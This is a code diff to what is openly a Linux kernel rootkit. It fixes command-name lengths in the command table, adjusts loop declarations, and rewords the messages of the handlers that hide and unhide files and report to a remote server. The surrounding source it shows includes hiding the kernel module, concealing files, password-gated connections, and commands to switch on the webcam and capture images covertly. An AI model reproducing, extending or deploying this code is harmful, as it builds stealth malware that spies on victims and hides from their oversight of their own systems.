@@ -62,9 +62,9 @@ static struct command rootkit_commands_array[] = {
     { "killcom", 7, "exit the module", 16, killcom_handler },
     { "hide_module", 11, "hide the module from the kernel", 34, hide_module_handler },
     { "unhide_module", 13, "unhide the module in the kernel", 36, unhide_module_handler },
-    { "hide", 8, "hide a directory or file", 34, hide_dir_handler },
-    { "unhide", 8, "unhide a directory or file", 36, show_dir_handler },
-    { "list", 8, "list hidden directories and files", 24, list_dir_handler },
+    { "hide", 4, "hide a directory or file", 34, hide_dir_handler },
+    { "unhide", 6, "unhide a directory or file", 36, show_dir_handler },
+    { "list", 4, "list hidden directories and files", 24, list_dir_handler },
     { "help", 4, "display this help message", 30, help_handler },
     { "start_webcam", 11, "activate webcam", 20, start_webcam_handler },
     { "capture_image", 13, "capture an image with the webcam", 50, capture_image_handler },
@@ -109,8 +109,9 @@ int rootkit_command(char *command, unsigned command_size) {
         return FAILURE;
     }
 
+    int i;
     int ret_code = -EINVAL;
-    for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
+    for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
         if (strncmp(command, rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_name_size) == 0) {
             char *args = command + rootkit_commands_array[i].cmd_name_size;
             while (args[0] == ' ')
@@ -139,7 +140,8 @@ int connect_handler(char *args) {
     char hash_str[SHA256_DIGEST_SIZE * 2 + 1] = { 0 };
     char passwd_hash_str[SHA256_DIGEST_SIZE * 2 + 1] = { 0 };
 
-    for (int i = 0; i < SHA256_DIGEST_SIZE; i++) {
+    int i;
+    for (i = 0; i < SHA256_DIGEST_SIZE; i++) {
         snprintf(hash_str + i * 2, 3, "%02x", hash[i]);
         snprintf(passwd_hash_str + i * 2, 3, "%02x", passwd_hash[i]);
     }
@@ -296,10 +298,10 @@ int hide_dir_handler(char *args) {
     dir[strcspn(dir, "\n")] = '\0';
     int ret_code = add_hidden_dir(dir);
     if (ret_code < 0) {
-        ERR_MSG("hide_dir_handler: failed to hide directory\n");
+        ERR_MSG("hide_dir_handler: failed to hide directory or file\n");
     }
     else {
-        DBG_MSG("hide_dir_handler: directory %s hidden\n", dir);
+        DBG_MSG("hide_dir_handler: directory or file %s hidden\n", dir);
     }
     return ret_code;
 }
@@ -310,10 +312,10 @@ int show_dir_handler(char *args) {
     dir[strcspn(dir, "\n")] = '\0';
     int ret_code = remove_hidden_dir(dir);
     if (ret_code < 0) {
-        ERR_MSG("show_dir_handler: failed to unhide directory\n");
+        ERR_MSG("show_dir_handler: failed to unhide directory or file\n");
     }
     else {
-        DBG_MSG("show_dir_handler: directory %s unhidden\n", dir);
+        DBG_MSG("show_dir_handler: directory or file %s unhidden\n", dir);
     }
     return ret_code;
 }
@@ -328,7 +330,7 @@ int list_dir_handler(char *args) {
 
     len = list_hidden_dirs(buf, STD_BUFFER_SIZE);
     if (len <= 0)
-        send_to_server("No hidden directories\n");
+        send_to_server("No hidden directoriesor files\n");
     else
         send_to_server(buf);
 
